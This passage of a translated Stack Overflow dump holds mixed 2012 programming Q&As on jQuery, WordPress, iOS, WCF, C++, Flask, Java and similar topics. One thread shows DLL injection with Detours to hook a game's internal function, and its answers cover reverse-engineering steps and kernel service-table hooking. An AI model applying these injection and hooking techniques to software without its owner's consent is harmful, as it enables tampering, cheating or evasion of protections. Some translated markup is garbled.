<select name="modify_increase_2nd[]" id="priorityIncrease2Issues" class="priorityIssue" multiple></select>
<br/>
<label>To Decrease </label><br/>
<label for="priorityDecrease1Issues">First Priority</label>
<select name="modify_decrease_1rst[]" id="priorityDecrease1Issues" class="priorityIssue" multiple></select>
<label for="priorityDecrease2Issues">Second Priority</label>
<select name="modify_decrease_2nd[]" id="priorityDecrease2Issues" class="priorityIssue" multiple></select>
<br />
<div class="complaint">
<label for="shoulders">Shoulders</label>
<select name=Shoulders id="shoulders" class="complaintOpt complaintItem">
    <option value="Null">Select</option>
    <option value="too_big" class="goal-decrease">Too Big</option>
    <option value="too_small" class="goal-increase">Too Small</option>
</select>    
<label for="shouldersRanking">Ranking</label>
<select name="importance_bother_shoulders" id="shouldersRanking" class="complaintOpt complaintRanking">
    <option value="Null">Select</option>
    <option value="1">1</option>
    <option value="2">2</option>
</select> 
</div> 
```

# jquery - 自定义 jQuery-UI 手风琴

> ID：13537956
> 
> 赞同：0
> 
> 时间：2012-11-24T03:21:54.177
> 
> 标签：jquery, css, jquery-ui

`content`我的网页中有一个名为 div 的 div ，我`index.html`在其中使用以下 javascript 从各种其他 html 页面加载内容。每当用户单击具有 class 的链接时，就会发生这种情况`myajaxreq`。

* * *

```
$('.myajaxreq').click(function() {
    var myhref=$(this).attr('href');
    $('#content').hide().load(myhref).fadeIn('slow');
    return false;
}); 
```

* * *

我需要从页面中单击其中一个链接，在此 div上加载一个[手风琴](http://jqueryui.com/accordion/)。但是，我遇到了一些问题：`content``acc.html`

* * *

(a) 手风琴占据了 div 中的所有可用宽度`content`。我希望它只占据 div 的 60%。我尝试在`acc.html`页面中执行此操作，即从中加载手风琴

```
`<style type="text/css">
    #myaccordion {
    width: 60%;}
</style>` 
```

* * *

(b) 我不希望手风琴主选项卡上有任何边框。我知道这看起来很容易，但我找不到相应的 css。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:27:23.683

使用浏览器控制台检查元素 css。您甚至可以通过简单地在控制台中单击该属性来禁用各种属性。您还可以在控制台中编辑属性值来测试它们。这将帮助您隔离需要覆盖的规则

# screen-scraping - Facebook 的 Linter 有开源版本吗？

> ID：13537959
> 
> 赞同：2
> 
> 时间：2012-11-24T03:23:02.110
> 
> 标签：screen-scraping, web-scraping

当您发布到 Facebook 的链接时，它会抓取文章标题、描述和相关图像。大多数主要网站都有所需的 OG 标签，因此很容易获取此信息，但 FB 也能够处理没有它们的网站（您可以[在这里](https://developers.facebook.com/tools/debug)尝试）。

显然，他们已经建立了一个系统，可以在没有 OG 标签的情况下获取这些信息。有谁知道有开源版本吗？

我认为它需要（按每个部分的优先顺序）：

标题：

1.  检查 og:title 标签。
2.  检查常规元“标题”标签。
3.  检查 h1 标签。

描述：

1.  检查 og:description 标签。
2.  检查常规元“描述标签”
3.  检查具有足够内容的 div 或 p 标签以指示正文段落

图片：

1.  检查 og:image 标签
2.  检查超过一定尺寸（比如 100x100）的图像，并优先考虑那些首先出现的图像。

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-25T12:43:14.970

[https://github.com/Anonyfox/node-htmlcarve](https://github.com/Anonyfox/node-htmlcarve)

Node.js的`htmlcarve`模块完成了您所追求的大部分工作，以下是[此页面](https://scotch.io/tutorials/using-mongoosejs-in-node-js-and-mongodb-applications)生成的输出：

```
htmlcarve = require('htmlcarve');

htmlcarve.fromUrl('https://scotch.io/tutorials/using-mongoosejs-in-node-js-and-mongodb-applications', function(error, data) {
  console.log(JSON.stringify(data, null, 2));
}); 
```

这会产生：

```
{
  "source": {
    "html_meta": {
      "title": "Easily Develop Node.js and MongoDB Apps with Mongoose â¥ Scotch",
      "summary": "",
      "image": "/wp-content/themes/thirty/img/scotch-logo.png",
      "language": "en-US",
      "feed": "https://scotch.io/feed",
      "favicon": "https://scotch.io/wp-content/themes/thirty/img/icons/favicon-57.png",
      "author": "Chris Sevilleja"
    },
    "open_graph": {
      "title": "Easily Develop Node.js and MongoDB Apps with Mongoose",
      "summary": "",
      "image": "https://scotch.io/wp-content/uploads/2014/11/mongoosejs-node-mongodb-applications.png"
    },
    "twitter_card": {
      "title": "Easily Develop Node.js and MongoDB Apps with Mongoose",
      "summary": "",
      "author": "sevilayha"
    }
  },
  "result": {
    "title": "Easily Develop Node.js and MongoDB Apps with Mongoose",
    "summary": "",
    "image": "https://scotch.io/wp-content/uploads/2014/11/mongoosejs-node-mongodb-applications.png",
    "author": "sevilayha",
    "language": "en-US",
    "feed": "https://scotch.io/feed",
    "favicon": "https://scotch.io/wp-content/themes/thirty/img/icons/favicon-57.png"
  },
  "links": {
    "deep": "https://scotch.io/tutorials/using-mongoosejs-in-node-js-and-mongodb-applications",
    "shallow": "https://scotch.io/tutorials/using-mongoosejs-in-node-js-and-mongodb-applications",
    "base": "https://scotch.io"
  }
} 
```

如果您已安装 Node.js，请使用

```
npm i -g htmlcarve 
```

您可以直接从命令行运行它。

# php - 是否可以根据另一个网站更新网站元素？

> ID：13537966
> 
> 赞同：-1
> 
> 时间：2012-11-24T03:24:52.267
> 
> 标签：php, html

我将提供一个例子，让我的问题更容易理解。有一个使用 PHP 的网站，在这个网站上的目标是创建一个元素，例如在这种情况下的图像，并相对于另一个网站的图像源更新该图像的源。这样，该图像将始终与其从中获取其来源的图像相同。这里的概念是使一个站点自动保持最新状态，而不必手动进入并更新源。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:30:09.640

您可以使用 file_get_contents() + 正则表达式来实现这一点。但是，如果源网站只为您提供此信息（通过提供 JSON 或 XML 以及您想要的必要信息）会更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:44:57.327

好的，现在我们知道真正的问题是什么，在您的 wordpress 主题中创建一个新的页面模板

```
<?php
/*
Template Name: Most Recent Thumbnail
*/
?>

<?php
$rs = new WP_Query();
$rs->query('showposts=20');
while ($rs->have_posts()) : $rs->the_post();

    if (has_post_thumbnail()) 
    {
        header('location:/'.get_bloginfo('url').wp_get_attachment_url( get_post_thumbnail_id($post->ID) ));
        die;
    }
endwhile; 

//if we got here no image was found in the last 20 posts, we should send the page to a backup image 
header('location: http://some.image');
die; 
```

在管理区新建一个页面，选择模板最近的缩略图，命名为最近的缩略图并发布。

```
<img src="http://mywordpress.site/most-recent-thumbnail" /> 
```

# ios - kCFSocketAcceptCallBack 未调用静态 IP 的 WIFI 连接

> ID：13537968
> 
> 赞同：0
> 
> 时间：2012-11-24T03:25:11.863
> 
> 标签：ios, xcode, networking, ip

我会尽量详细。我正在尝试在我的应用程序中从我的 iPhone 连接到采集单元。我们使用的是 IP4，而采集单元不支持 DHCP，因此它总是扫描具有特定静态 IP 和端口号的设备。

在我测试设备和我的 iPhone 之间的连接之前，我使用我的桌面创建了一个 adhoc 网络，并在我的 iPhone 上进行了尝试。这是我的代码的一部分。

```
CFSocketContext CTX = { 0, description, NULL, NULL, NULL };
/* Create the server socket as a TCP IPv4 socket and set a callback */
/* for calls to the socket's lower-level accept() function */
TCPServer = CFSocketCreate(NULL, PF_INET, SOCK_STREAM, IPPROTO_TCP,
                           kCFSocketAcceptCallBack
                           , (CFSocketCallBack)WiFiCallBack, &CTX);
    /* Set the port and address we want to listen on */
struct sockaddr_in addr;
memset(&addr, 0, sizeof(addr));
addr.sin_len = sizeof(addr);
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = htonl(INADDR_ANY);

CFDataRef addressData = CFDataCreate( NULL, (UInt8*)(&addr), sizeof( struct sockaddr_in )      );
CFSocketSetAddress(TCPServer, addressData); 
```

它可以工作，如果我将分配给 iPhone 的 IP 输入到我桌面上的 PC 应用程序，我可以在我的桌面和 iPhone 之间进行数据传输。但是，如果我为 iPhone 设置一个静态 IP 并尝试让 PC 应用程序连接到具有该 IP 的任何设备，它就不起作用。

我的采集单元也是如此。根本不调用回调函数。

我急需帮助，因此欢迎任何形式的帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T18:06:14.153

对不起，你的帖子不是很清楚。

您是否正在尝试在 iPhone 上建立服务器套接字，并从其他地方连接到它？

由于许多原因，这将是一个问题。

首先是你的ip不会是一样的。当连接到 WIFI 时，您将拥有一个至少在当前网络上可路由的 ip。

但是当连接到 3g（或 lte 等）时，您可能根本无法路由到给定的 ip。

即使您在某个接口上确实有一个完全可路由的 IP 地址并且存在足够长的时间，iOS 也不是为此而设计的。您的应用程序将无法在后台高效运行并侦听服务器套接字。您可以使用持久套接字和 voip 后台模式来模拟这一点。但是，这需要一个单独的服务器组件。

您也可以尝试从 iPhone 进行轮询，这可能会满足您的要求。

# ios - 将 NSURL 从一个类传递到另一个类

> ID：13537970
> 
> 赞同：0
> 
> 时间：2012-11-24T03:25:20.413
> 
> 标签：ios, cocoa-touch

在我的didFinishLaunchingWithOptions 的appDelegate 中，我有以下内容：

```
NSURL *url = [NSURL URLWithString:@"http://www.thejenkinsinstitute.com/Journal/"];
NSString *content = [NSString stringWithContentsOfURL:url];
NSString * aString = content;
NSMutableArray *substrings = [NSMutableArray new];
NSScanner *scanner = [NSScanner scannerWithString:aString];
[scanner scanUpToString:@"<p>To Download the PDF, " intoString:nil]; // Scan all characters before #
while(![scanner isAtEnd]) {
    NSString *substring = nil;
    [scanner scanString:@"<p>To Download the PDF, <a href=\"" intoString:nil]; // Scan the # character
    if([scanner scanUpToString:@"\"" intoString:&substring]) {
        // If the space immediately followed the #, this will be skipped
        [substrings addObject:substring];
    }
    [scanner scanUpToString:@"" intoString:nil]; // Scan all characters before next #
}
// do something with substrings

NSString *URLstring = [substrings objectAtIndex:0];
self.theheurl = [NSURL URLWithString:URLstring];
NSLog(@"%@", theheurl);
[substrings release]; 
```

theheurl 的控制台打印输出为我提供了一个以 .pdf 结尾的有效 URL。

在我想加载 URL 的类中，我有以下内容：

```
- (void)viewWillAppear:(BOOL)animated
{
_appdelegate.theheurl = currentURL;
NSLog(@"%@", currentURL);
NSLog(@"%@", _appdelegate.theheurl);
[worship loadRequest:[NSURLRequest requestWithURL:currentURL cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:60.0]];
timer = [NSTimer scheduledTimerWithTimeInterval:(1.0/2.0) target:self selector:@selector(tick) userInfo:nil repeats:YES];
[super viewWillAppear:YES];

} 
```

但是，该类中的两个 NSLog 都返回 null。我在将 NSURL 从 AppDelegate 获取到类以加载它时做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T05:09:10.950

在您的第二个代码中，只需更改分配值。

```
- (void)viewWillAppear:(BOOL)animated
{

AppDelegate *appdell= (AppDelegate *)[[UIApplication sharedApplication] delegate];

  currentURL=appdell.theheurl;
NSLog(@"%@", currentURL);
NSLog(@"%@", appdell.theheurl);
[worship loadRequest:[NSURLRequest requestWithURL:currentURL cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:60.0]];
timer = [NSTimer scheduledTimerWithTimeInterval:(1.0/2.0) target:self selector:@selector(tick) userInfo:nil repeats:YES];
[super viewWillAppear:YES];

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T05:20:42.083

我从上面的几行中了解到，您需要从某个类中获取 url，例如`MyFirstViewControlle`，并且；之后，您尝试将该 url 保存在您的 中`appDelegate`，例如`MyAppDelegate`，这样您就可以在不同的控制器中使用相同的内容说，`MyOtherViewController`...如果我的方向正确，那么请说明您是如何制作的`object of appDelegate`，它应该是这样的： （在你的`MyFirstViewController`）

```
MyAppDelegate *objMyAppDelegate = (MyAppDelegate*)[[UIApplication sharedApplication] delegate]; 
```

并且，还要确保在 appDelegate 中合成 url 属性，如下所示：

```
@property(nonatomic,retain)NSURL *theURL;
@property(strong)NSURL *theURL;//ios 5.0 
```

之后，由于您已经创建了委托对象，请执行以下操作：

```
objMyAppDelegate.theURL = _currentURL; 
```

如果您还有任何疑问，请告诉我。

# android - 如何折叠 Android ExpandableList 项中的所有 ChildView 组？

> ID：13537979
> 
> 赞同：3
> 
> 时间：2012-11-24T03:28:23.273
> 
> 标签：android, expandablelistview

如何将所有 ChildView 组折叠在`Expandable List`. 现在我有两个按钮来控制 Activity 上的全部展开和全部折叠。可扩展按钮没问题，它正在工作，但我不知道如何折叠所有 ChildView 组。我怎样才能做到这一点 ？

谢谢

```
**expandableListView.expandGroup(position, true); = OK<Br>

expandableListView.foldGroup(position) = ? or ?** 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T04:52:42.920

试试这个，

```
int count = (new ExpAdapter(this)).getGroupCount();
        b.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                for (int i = 0; i < count; i++)
                {
                    expList.collapseGroup(i);
                }

            }
        }); 
```

# c# - WCF 方法不接受可空 int 参数的空值

> ID：13537988
> 
> 赞同：1
> 
> 时间：2012-11-24T03:31:00.563
> 
> 标签：c#, asp.net, wcf, int, nullable

我有一个 WCF 方法，它可以使用可为空的 int 作为参数进行良好编译。但是，当我从另一个项目中引用该服务时，它需要一个普通的 int 作为参数。从阅读其他 stackoverflow 线程来看，似乎可以有一个可为空的 int 参数，但是，我无法弄清楚如何实现它。

我的代码如下：

```
[ServiceContract]
public interface IService
{
    [OperationContract]
    string CompletePayment(int paymentType, int? userId)
}

public class Service : IService
{

    public string CompletePayment(int paymentType, int? userId)
    {
        return "it worked";
    }        
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:50:06.460

`int?`只是语法糖`Nullable<int>`，我认为在服务合同中使用泛型时有一些限制。请参阅此答案：[WCF 服务合同能否具有可为空的输入参数？](https://stackoverflow.com/questions/1393359/can-a-wcf-service-contract-have-a-nullable-input-parameter)

# asp.net-mvc - 在 MVC3 中实现网格的好方法是什么？

> ID：13537991
> 
> 赞同：0
> 
> 时间：2012-11-24T03:32:07.873
> 
> 标签：asp.net-mvc, asp.net-mvc-3

我想在网格中编辑模型中的多行。我真的希望能够在网格内编辑“内联”，而不是通过另一个控制器转到另一个页面。

我知道看起来很精简的“Web Grid”，但我相信它需要转到编辑页面。

首先，为了简单起见，我想专注于服务器解决方案。此外，我希望控件尊重视图模型中的验证数据注释。

非常感谢，

埃德

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T06:39:46.850

您可以为数据表呈现您自己的网格，并在其中包含一个表单以允许用户编辑特定行。您将需要实现典型的网格功能来控制此过程，例如行选择、插入、编辑、更新和可能的删除。Web Forms 世界中有很多好的模型可供您使用，包括但不限于 MS 和 Telerik 控件。

如果您打算在您的应用程序中广泛使用此类网格，我建议将此功能包装在一个 HtmlHelper 扩展中，该扩展接受数据表和您需要作为参数的配置选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T13:10:28.393

[http://datatables.net/](http://datatables.net/)是一个非常好的 jQuery 网格。试试看。

还有其他选择

剑道：[http ://demos.kendoui.c​​om/web/grid/index.html](http://demos.kendoui.com/web/grid/index.html)

jqgrid。[http://jqgrid.com/](http://jqgrid.com/)

# c++ - 从字符串中删除 BBcode

> ID：13537992
> 
> 赞同：0
> 
> 时间：2012-11-24T03:32:12.743
> 
> 标签：c++, xml, string, bbcode

所以看起来这个问题已经被问到几乎所有的语言都在阳光下......除了C ++。我有一个 XML 文档，其中有一些 bbcode 存储在文本节点中。我正在寻找删除它的最佳方法，我想我会在这里查看是否有人知道一些预先构建的库或一些自己完成此操作的有效方法。我正在考虑可能删除介于“[”和“]”字符之间的任何内容，但是使用提供给我的 XML 文档会变得很疯狂，因为 BB 的许多实例都在表单中`'[[blahblahblah]]'`，有些`'[blahblahblah].'`

这是 XML 文档。标签之间的所有数据`<text>`都被添加到一个字符串中，有什么建议吗？

```
<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.7/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.7/ http://www.mediawiki.org/xml/export-0.7.xsd" version="0.7" xml:lang="en">
 <page>
   <title>Human Anatomy/Osteology/Axialskeleton</title>
   <ns>0</ns>
   <id>181313</id>
   <revision>
      <id>1481605</id>
      <parentid>1379871</parentid>
      <timestamp>2009-04-26T02:03:12Z</timestamp>
      <contributor>
          <username>Adrignola</username>
          <id>169232</id>
      </contributor>
      <minor />
      <comment>+Category</comment>
      <sha1>hvxozde19haz4yhwj73ez82tf2bocbz</sha1>
      <text xml:space="preserve"> [[Image:Axial_skeleton_diagram.svg|thumb|240px|right|Diagram of the axial skeleton]]

       The Axial Skeleton is a division of the human skeleton and is named because it makes up the longitudinal ''axis'' of the body. It consists of the skull, hyoid bone, vertebral column, sternum and ribs. It is widely accepted to be made up of 80 bones, although this number varies from individual to individual.

       [[Category:{{FULLBOOKNAME}}|{{FULLCHAPTERNAME}}]]</text>
   </revision>
  </page>
  <page>
    <title>Horn/General/Fingering Chart</title>
    <ns>0</ns>
    <id>23346</id>
    <revision>
        <id>1942387</id>
        <parentid>1734837</parentid>
        <timestamp>2010-10-02T20:21:09Z</timestamp>
        <contributor>
            <username>Nat682</username>
            <id>144010</id>
        </contributor>
        <comment>added important note</comment>
        <sha1>lana7m8m9r23oor0nh24ky45v71sai9</sha1>
        <text xml:space="preserve">{{HornNavGeneral}}
     The horn spans four plus octaves depending on the player and uses both the treble and bass clefs. In this chart it is assumed the player is using a double-horn with F and Bb sides. The number 1 indicates that the index-finger valve should be depressed, the number 2 indicates that the middle-finger valve should be depressed and the number 3 indicates that the ring-finger valve should be depressed. There are eight possible valve combinations among the first, second and third valves: 0, 1, 2, 3, 1-2, 1-3, 2-3, and 1-2-3\. However, there are effectively seven combinations, because 1-2 will produce the same notes, perhaps slightly out of tune, as 3 alone. One depresses the thumb key to use the Bb side of the horn.
    [[Image:Fingering chart.png]]
    [[Category:Horn]]</text>
    </revision>
  </page>
</mediawiki> 
```

因此，如果您查看每个标签的底部`<page>`，您会看到类似`[[Category:{{FULLBOOKNAME}}|{{FULLCHAPTERNAME}}]]`的内容，这就是我想要删除的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:49:00.097

我假设数据是以您可以读取的迭代器的形式提供给您的。如果您以 a 的形式获得它，那么`std::string`获得一个可以读取的迭代器非常容易。

在这种情况下，你想要的是一个提升`filter_iterator`： http: [//www.boost.org/doc/libs/1_39_0/libs/iterator/doc/filter_iterator.html](http://www.boost.org/doc/libs/1_39_0/libs/iterator/doc/filter_iterator.html)

您想要的过滤器功能非常简单。您跟踪`[`您看到的数量并减去`]`您看到的数量（停止在 0）。当你的计数是正数时，你过滤掉了这个角色。

如果您不能使用`boost`，但您是从 获得它`std::string`，那么这有点棘手。但只有一点。 `std::copy_if`作品。

如果您使用的是 C++11，那么 lambda 会让这变得非常简单。如果没有，您将不得不编写自己的算数`[`s 的函子。

作为一个简单案例的具体示例：您正在接受 a`std::string`并且想要生成 a`std::string`没有任何`[]`分隔的内容。

```
struct SquareBracketStripper
{
  enum { open_bracket = '[', close_bracket = ']' };
  size_t count;
  SquareBracketStripper():count(0) {}
  bool operator()(char c)
  {
    bool skip = (count > 0) || c == open_bracket;
    if (c == open_bracket) {
      ++count;
    } else if (c== close_bracket && count > 0) {
      --count;
    }
    return skip;
  }
};

std::string FilterBBCode( std::string input ) {
  input.erase(input.end(), std::remove_if( input.begin(), input.end(), SquareBracketStripper() ) );
  return input;
} 
```

它处理嵌套`[]`s 的任意深度。

帮助您永远不必将`filter_iterator`整个字符串加载到内存中，如果您不知道输入的格式错误，这很有用。`[]`当您可以流式传输数据并即时进行过滤时，不需要将几 TB 的数据从磁盘加载到内存中以进行过滤。但是您的用例可能并不在乎。

# windows - 识别和拦截函数调用

> ID：13537995
> 
> 赞同：3
> 
> 时间：2012-11-24T03:32:58.580
> 
> 标签：windows, hook, reverse-engineering, disassembly, ida

我正在为游戏开发启动器。想要拦截游戏对打印文本的函数的调用。

不知道包含这个函数的代码是动态链接的还是静态链接的。所以我什至不知道函数名。

我确实通过Microsoft Detours、Ninject 和其他一些人截获了这个游戏的一些windows-api 调用。

但这一个也不在导入表中。

我应该怎么做才能捕捉到这个函数调用？应该使用什么分析器？国际开发协会？如何做到这一点？

* * *

**编辑：**

终于找到函数地址了。谢谢，斯金诺！

试图将它与 Detours 挂钩，注入 dll。注入的 DllMain：

```
typedef int (WINAPI *PrintTextType)(char *, int, float , int);

static PrintTextType PrintText_Origin = NULL;

int WINAPI PrintText_Hooked(char * a, int b, float c, int d)
{
    return PrintText_Origin(a, b, c , d);
}

HMODULE game_dll_base;
/* game_dll_base initialization goes here */

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if(fdwReason==DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinstDLL);
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        PrintText_Origin = (PrintTextType)((DWORD)game_dll_base + 0x6049B0);
        DetourAttach((PVOID *)&PrintText_Origin , PrintText_Hooked);
        DetourTransactionCommit();
    }
} 
```

它按预期挂钩。参数`a`具有应显示的文本。但是当调用原始函数应用程序`return PrintText_Origin (a, b, c , d);`崩溃[（](http://i46.tinypic.com/dfeh4.png)[http://i46.tinypic.com/ohabm.png，http://i46.tinypic.com/dfeh4.png](http://i46.tinypic.com/ohabm.png)）

***原功能拆解：***

[http://pastebin.com/1Ydg7NED](http://pastebin.com/1Ydg7NED)

***绕道后：***

~~[http://pastebin.com/eM3L8EJh](http://pastebin.com/eM3L8EJh)~~

**编辑2：**

***绕道后：***

[http://pastebin.com/GuJXtyad](http://pastebin.com/GuJXtyad)

`PrintText_Hooked`反汇编[http://pastebin.com/FPRMK5qt](http://pastebin.com/FPRMK5qt) **w3_loader.dll**是注入的dll

我不擅长 ASM，请告诉我可能出了什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T07:01:39.483

在这个阶段，听起来您不知道要挂钩的库函数，并且您已经声明它不是（显然至少）导入表中的导入外部函数，这可能意味着该函数负责生成文本可能位于您直接反汇编或动态加载的应用程序的 .text 中，文本生成（尤其是在游戏中）可能是应用程序的一部分。

根据我的经验，查找难以追踪的代码的最简单方法是在显示文本期间或之前/之后立即停止应用程序，并使用 IDA 出色的调用图功能来确定负责将其写出的内容（自由使用手表和断点！）

如果您有理由相信此功能可能由未显示在导入表中的导出函数提供，请仔细查看对[CreateRemoteThread或任何其他常用动态加载机制的调用。](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx)

我强烈建议不要这样做，但为了完整起见，您也可以在[系统服务调度表](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx)中挂钩 NtSetInformationThread 。[这里](http://j00ru.vexillium.org/ntapi/)是不同 Windows 版本的一个很好的表格转储。如果您想自己获取表中的索引，您可以从 ntdll.dll 反汇编 NtSetInformationThread 导出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T15:32:53.067

> 想要拦截游戏对打印文本的函数的调用。

您可以**在调查阶段使用调试器**。IDA 甚至 Visual Studio（与例如 HxD 结合）都应该这样做。使用以下步骤识别函数应该相对容易：

1.  识别要跟踪其打印的特定文本片段（例如`Hello World!`）
2.  在游戏正常打印您在上面确定的片段*之前*的任何时候中断游戏执行
3.  ^(在游戏内存中)搜索该文本片段^(†</sup>（**查找 Unicode 或 ANSI ）。**IDA 将允许您执行 IIRC，免费的[HxD](http://mh-nexus.de/en/hxd/) ( `Extras`> `Open RAM...`))
4.  一旦确定了片段的地址，**设置一个访问中断/读取**数据断点，这样调试器就会让您控制游戏尝试*读取*所述片段的时刻（在显示它的同时或之前）
5.  恢复执行，等待数据断点触发
6.  检查堆栈跟踪并寻找合适的挂钩候选者
7.  如果您想探索其他潜在的挂钩点，请从从内存中读取片段到打印片段的那一刻逐步进行

^(†提供的文本直到最后一刻才保持压缩（或者，无论出于何种原因，加密）)

完成调查阶段并确定要在哪里注入钩子后，**在编写启动器时有两种选择**：

1.  如果根据上述练习，您毕竟能够识别导出/导入，那么使用任何 API 挂钩技术
2.  **编辑**使用 Microsoft Detours，确保您首先正确[**识别您尝试绕行的函数的调用约定**（cdecl、fastcall、stdcall）](http://en.wikibooks.org/wiki/X86_Disassembly/Calling_Convention_Examples#Microsoft_C_Compiler)，并将该调用约定用于原始原型以及实现假人。请参阅[示例](https://github.com/RamseyK/hooktests/blob/master/dmdetour/dmdetour/dmdetour.cpp)。
3.  如果没有，你将不得不
    *   使用[调试 API](http://msdn.microsoft.com/en-us/library/windows/desktop/ms679303.aspx)以编程方式加载游戏
    *   根据您的调查阶段计算挂钩地址（作为与模块库的硬编码偏移量，或通过在挂钩站点周围查找指令字节^(‡</sup>）)
    *   设置断点
    *   恢复进程
    *   等待断点触发，做你该做的事
    *   恢复执行，再次等待下一个触发器等**，所有这些都由您的启动器通过 Debugging API 以编程方式完成**。

^(‡能够继续使用游戏的最终补丁版本)

# python - Python Flask 出现 404 Not Found 错误

> ID：13537996
> 
> 赞同：2
> 
> 时间：2012-11-24T03:33:21.137
> 
> 标签：python, http-status-code-404, flask

我正在使用 Flask 设计这个简单的网站。但是我的 hello 方法出现 404 错误。每当我单击“评价艺术家”按钮时，都会出现错误，但 home.html、hello.html 和 artist.html 的模板都是正确的。我不知道我的代码的哪一部分是错误的。有什么帮助吗？

```
@app.route("/",methods=['GET','POST'])
def login():
    if request.method=="GET":
        return render_template("home.html")
    if request.method=="POST":
        if (request.form["button"]=="login"):
            return render_template("hello.html",name=request.form["name"])

@app.route("/hello",methods=['GET','POST'])
def hello():
    if request.method=="GET":
        if(request.form["button"]=="rate artists"):
            return render_template("artist.html") 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-12-25T11:26:55.547

我有同样的问题。

我正在骨干网和 Flask 之间做一些实验性 CORS 测试，作为不同 url 中的端点

您是在 Config 对象中使用 SERVER_NAME 还是在使用 app.run 时使用？

我放了 SERVER_NAME 但没有指定端口，

```
class Config(object):
    DEBUG = True
    TESTING = True
    STATIC_FOLDER = STATIC_FOLDER
    STATIC_URL = STATIC_URL
    NAVIGATION_JS = '/static/js/navigation.js'
    SESSION_COOKIE_SECURE = True
    REDIS_HOST_SESSION = 'localhost'
    REDIS_PORT_SESSION = 6379
    REDIS_DB_SESSION = 2
    REDIS_HOST = 'localhost'
    REDIS_PORT = 6379
    REDIS_DB = 3
    SERVER_NAME = 'api.jvazquez.com.ar' 
```

服务器名称没有端口

对于我定义的任何路线，我也得到了 404（*如果你有兴趣，我正在使用蓝图*）

当我使用 curl 向我的烧瓶应用程序发送请求时，我得到 404，这是我为我定义的所有蓝图得到的输出 404

```
jvazquez@aldebaran:~$ curl -i http://api.jvazquez.com.ar:5000/alive/
HTTP/1.0 404 NOT FOUND
Content-Type: text/html
Content-Length: 233   
Set-Cookie: session=94c2c120-34c0-4a00-b094-7b5623d438ff; Domain=.api.jvazquez.com.ar; HttpOnly; Path=/
Server: Werkzeug/0.9.4 Python/2.7.3
Date: Wed, 25 Dec 2013 11:21:16 GMT 
```

所以，检查你是否定义了配置变量 SERVER_NAME 并且它有端口

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-07T17:58:59.990

For whatever reason I encountered this when I set the SERVER_NAME to `127.0.0.1` instead of `localhost`. I don't know why that was important with my setup, but after changing it to `localhost` everything started working again.

# java - java中的交集方法，我如何对交集的边界进行排序，这样我就不会得到重复

> ID：13537998
> 
> 赞同：1
> 
> 时间：2012-11-24T03:33:28.043
> 
> 标签：java, algorithm, sorting, intersect

我正在尝试解决这个练习[Two Intervals Intersection](https://docs.google.com/document/d/1etfBC8D6yTv6YRSpvGaZ73M61lKWBO6KYkcdrFRdIyo/edit?pli=1)，我认为我解决了几乎所有问题，但是当我尝试示例输入时，我得到 15 和 5，并且我想对结果进行排序，我的想法是使用 arraylist间隔，然后删除重复项，但我只是想要一个更好的方法来解决这个问题，如果我输入作为输入 2 3 和 2 3 我得到作为输出 2 3 和 2 3，这就是为什么我问你一个更好的方法来解决这个练习，任何更好的想法

感谢帮助

这是我到目前为止的代码

```
import java.util.*;
public class TwoIntervalIntersection {
    public static void main(String args[]){
        Scanner sc = new Scanner(System.in);
        int n1 = sc.nextInt();
        int n2 = sc.nextInt();
        int n3 = sc.nextInt();
        int n4 = sc.nextInt();

        if(n1 >= n3 && n1 <= n4){
            System.out.print(n1);
            System.out.print(" ");
        }

        if(n2 >= n3 && n2 <= n4){
            System.out.print(n2);
            System.out.print(" ");
        }

        if(n3 >= n1 && n3 <= n2){
            System.out.print(n3);
            System.out.print(" ");
        }

       if(n4 >= n1 && n4 <= n2){
            System.out.print(n4);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T06:49:15.177

嘿，您的方法还不错，尽管最好在最后打印之前存储这些东西，这样您就可以在控制台中最终打印之前更改/交换/检查它们的值。要修复间隔以错误方式发布的部分，您可以执行以下操作：

```
public static void main(String args[]){

        Scanner sc = new Scanner(System.in);
        System.out.print("Enter interval one: ");
        int left1 = sc.nextInt();
        int right1 = sc.nextInt();
        System.out.print("Enter interval two: ");
        int left2 = sc.nextInt();
        int right2 = sc.nextInt();

        int end1 = 0;
        int end2 = 0;

        if(left1 >= left2 && left1 <= right2)
            end1 = left1;

        if(right1 >= left2 && right1 <= right2)
            end2 = right1;

        if(left2 >= left1 && left2 <= right1)
           end1 = left2;

       if(right2 >= left1 && right2 <= right1)
            end2 = right2;

       if(end1 > end2){
            int h= end1;
            end1 = end2;
            end2 = h;
        }

       System.out.println(end1 + " " + end2);
} 
```

